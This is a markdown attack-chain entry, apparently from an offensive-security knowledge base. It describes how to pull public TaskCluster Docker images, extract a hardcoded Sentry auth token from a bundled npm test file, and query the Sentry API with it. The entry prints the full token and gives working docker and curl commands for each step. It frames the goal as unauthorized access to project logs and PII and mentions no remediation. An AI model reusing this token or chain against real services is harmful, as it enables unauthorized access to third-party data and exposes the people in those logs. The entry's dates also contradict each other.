---
tags:
  - docker
  - sentry
  - token-exposure
  - information-disclosure
  - npm
  - secrets
type: attack_chain
tools:
  - '[[tools/Docker]]'
  - '[[tools/curl]]'
tactics:
  - '[[Reconnaissance]]'
  - '[[Discovery]]'
commands:
  - '[[commands/browse-docker-hub-tags]]'
  - '[[commands/docker-pull-taskcluster]]'
  - '[[commands/docker-inspect-image-file]]'
  - '[[commands/curl-sentry-api-test]]'
platforms:
  - Docker
  - Cloud
  - Linux
complexity: medium
procedures:
  - '[[procedures/Browse-Docker-Hub-for-TaskCluster-Image-Tags]]'
  - '[[procedures/Pull-Specific-TaskCluster-Docker-Images]]'
  - '[[procedures/Inspect-Docker-Images-for-Hardcoded-Secrets]]'
  - '[[procedures/Test-Exposed-Sentry-Token-with-API-Request]]'
step_count: 4
techniques:
  - '[[Active Scanning]]'
  - '[[File and Directory Discovery]]'
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
description: >-
  Multi-stage attack exploiting a hardcoded Sentry authentication token exposed
  in public TaskCluster Docker images on Docker Hub, enabling unauthorized
  access to Sentry project data and logs.
skill_level: intermediate
impact_level: high
id: a0bf0963-3289-42b0-8c05-658d8a2aa310
created_at: '2025-12-14T17:31:42.969Z'
updated_at: '2025-12-14T17:31:42.969Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Reconnaissance]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Active Scanning]]'
  - '[[File and Directory Discovery]]'
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
---
# Sentry Auth Token Exposure in TaskCluster Docker Images Leading to Unauthorized Project Access

## Overview

This attack chain demonstrates the discovery and exploitation of a hardcoded Sentry authentication token in public Docker images for the TaskCluster project hosted on Docker Hub. The vulnerability stems from an old version of the sentry-api npm package including a test token in its files, which was not removed before building the images. Attackers can pull these images, extract the token, and use it to access Sentry.io projects, potentially exposing application logs with sensitive information, PII, and further vulnerabilities. The chain involves reconnaissance on Docker Hub, pulling and inspecting images, and validating the token via API calls.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance on Docker Hub] --> B[Pull Docker Images]
    B --> C[Inspect Images for Secrets]
    C --> D[Exploit Token via API]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Docker]]
- [[tools/curl]]

### Target Environment

- Docker Hub public repository: taskcluster/taskcluster
- Access to a system with Docker installed
- Internet connectivity for pulling images and API requests

### Initial Access Requirements

- No credentials required; all steps use public resources
- Basic knowledge of Docker and HTTP APIs

## Detailed Attack Procedures

### Step 1: Reconnaissance on Docker Hub
procedure: [[procedures/Browse-Docker-Hub-for-TaskCluster-Image-Tags]]

**Objective**: Identify available Docker image tags for the TaskCluster repository to select candidates for inspection.

**Instructions**: Use a web browser or command-line tool to browse the Docker Hub tags page for the taskcluster/taskcluster repository.

Execute [[commands/browse-docker-hub-tags]] to list available tags:

```bash
echo "Visit https://hub.docker.com/r/taskcluster/taskcluster/tags" && curl -s https://hub.docker.com/v2/repositories/taskcluster/taskcluster/tags/?page_size=100 | jq '.results[].name'
```

**Expected Output**: A list of image tags such as v15.0.0-20-g0eca18b7c, c061025dc, ba7958766, v16.2.0-77-gd8577f62a.

**Success Indicators**:
- Repository tags successfully retrieved
- Multiple tags identified for pulling

### Step 2: Pull Specific Docker Images
procedure: [[procedures/Pull-Specific-TaskCluster-Docker-Images]]

**Objective**: Download vulnerable Docker images containing the exposed token.

**Instructions**: Use Docker to pull specific tags known to contain the vulnerable sentry-api package.

Execute [[commands/docker-pull-taskcluster]] for each tag:

```bash
docker pull taskcluster/taskcluster:v15.0.0-20-g0eca18b7c
docker pull taskcluster/taskcluster:c061025dc
docker pull taskcluster/taskcluster:ba7958766
docker pull taskcluster/taskcluster:v16.2.0-77-gd8577f62a
```

**Expected Output**: Images downloaded successfully, confirmed with `docker images` listing the pulled tags.

**Success Indicators**:
- Images pulled without errors
- Local Docker storage contains the target images

### Step 3: Inspect Docker Images for Hardcoded Secrets
procedure: [[procedures/Inspect-Docker-Images-for-Hardcoded-Secrets]]

**Objective**: Examine the contents of pulled images to locate the hardcoded Sentry token.

**Instructions**: Run a container from the image and inspect the filesystem for the vulnerable file.

Execute [[commands/docker-inspect-image-file]] to search within the image:

```bash
docker run --rm -it taskcluster/taskcluster:v15.0.0-20-g0eca18b7c cat /app/node_modules/sentry-api/test.js | grep -i token
```

**Expected Output**: The file contents reveal the token: 5841673fc43843db98088d579568271bcee388b21d91455b9c1fb151bab260b9.

**Success Indicators**:
- Token extracted from /app/node_modules/sentry-api/test.js
- No access restrictions encountered

### Step 4: Exploit Exposed Sentry Token with API Request
procedure: [[procedures/Test-Exposed-Sentry-Token-with-API-Request]]

**Objective**: Validate and use the token to gain unauthorized access to Sentry projects.

**Instructions**: Use the extracted token in an API request to Sentry.io.

Execute [[commands/curl-sentry-api-test]] to query projects:

```bash
curl -X GET -H "Authorization: Bearer 5841673fc43843db98088d579568271bcee388b21d91455b9c1fb151bab260b9" https://sentry.io/api/0/projects/
```

**Expected Output**: JSON response listing Sentry projects, confirming token validity and access.

**Success Indicators**:
- HTTP 200 response with project data
- Access to logs and sensitive information granted

## Attack Chain Summary

### Key Achievements

1. Discovered exposed Sentry token in public Docker images
2. Extracted and validated the token for active use
3. Gained unauthorized access to Sentry projects, exposing PII and logs

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Active Scanning]] Active Scanning
- [[File and Directory Discovery]] File and Directory Discovery
- [[Unsecured Credentials]] Unsecured Credentials
- [[Valid Accounts]] Valid Accounts

### MITRE ATT&CK Tactics

- [[Reconnaissance]] Reconnaissance
- [[Discovery]] Discovery

---
*Last updated: 2023-10-01*
